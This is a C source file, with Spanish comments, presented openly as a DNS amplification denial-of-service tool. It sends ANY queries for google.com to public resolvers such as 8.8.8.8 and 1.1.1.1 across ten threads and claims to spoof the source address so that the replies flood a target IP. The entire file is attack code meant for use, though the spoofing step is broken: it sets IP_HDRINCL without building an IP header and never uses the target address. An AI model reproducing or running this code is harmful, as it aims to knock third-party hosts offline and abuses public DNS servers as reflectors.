#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>

// DNS query for ANY record (large response)
unsigned char dns_query[] = {
    0x12, 0x34,  // Transaction ID
    0x01, 0x00,  // Flags: Standard query
    0x00, 0x01,  // Questions: 1
    0x00, 0x00,  // Answer RRs: 0
    0x00, 0x00,  // Authority RRs: 0
    0x00, 0x00,  // Additional RRs: 0
    // Query: google.com
    0x06, 'g', 'o', 'o', 'g', 'l', 'e',
    0x03, 'c', 'o', 'm',
    0x00,        // Null terminator
    0x00, 0xff,  // Type: ANY (255)
    0x00, 0x01   // Class: IN (1)
};

void *dns_amplification(void *arg) {
    char **args = (char **)arg;
    char *target_ip = args[0];
    int target_port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    // Lista de DNS recursivos públicos (reflectores)
    char *dns_servers[] = {
        "8.8.8.8",      // Google DNS
        "8.8.4.4",      // Google DNS
        "1.1.1.1",      // Cloudflare
        "9.9.9.9",      // Quad9
        "208.67.222.222", // OpenDNS
        NULL
    };
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in dns_addr, target_addr;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    // Spoof source IP to target (para que la respuesta vaya al objetivo)
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    time_t start = time(NULL);
    unsigned long queries = 0;
    int server_idx = 0;
    
    while(time(NULL) - start < duration) {
        if(!dns_servers[server_idx]) server_idx = 0;
        
        memset(&dns_addr, 0, sizeof(dns_addr));
        dns_addr.sin_family = AF_INET;
        dns_addr.sin_port = htons(53);
        inet_pton(AF_INET, dns_servers[server_idx], &dns_addr.sin_addr);
        
        // Cambiar Transaction ID para cada query
        dns_query[0] = rand() % 256;
        dns_query[1] = rand() % 256;
        
        // Enviar query al DNS server con IP spoofed
        sendto(sock, dns_query, sizeof(dns_query), 0, 
               (struct sockaddr*)&dns_addr, sizeof(dns_addr));
        
        queries++;
        server_idx++;
        
        if(queries % 1000 == 0) {
            printf("[DNS-AMP] Sent %lu queries via %s\n", queries, dns_servers[server_idx-1]);
        }
        
        usleep(1000); // Pequeña pausa
    }
    
    close(sock);
    printf("[DNS-AMP] Thread completed - %lu queries\n", queries);
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("DNS Amplification Attack (50-100x)\n");
        printf("Usage: %s <TARGET_IP> <TARGET_PORT> <TIME>\n", argv[0]);
        return 1;
    }
    
    printf("[DNS-AMP] Starting amplification attack on %s:%d\n", argv[1], atoi(argv[2]));
    printf("[DNS-AMP] Using public DNS servers as reflectors\n");
    
    pthread_t threads[10];
    
    for(int i = 0; i < 10; i++) {
        pthread_create(&threads[i], NULL, dns_amplification, argv + 1);
    }
    
    sleep(atoi(argv[3]));
    
    printf("[DNS-AMP] Attack completed\n");
    return 0;
}
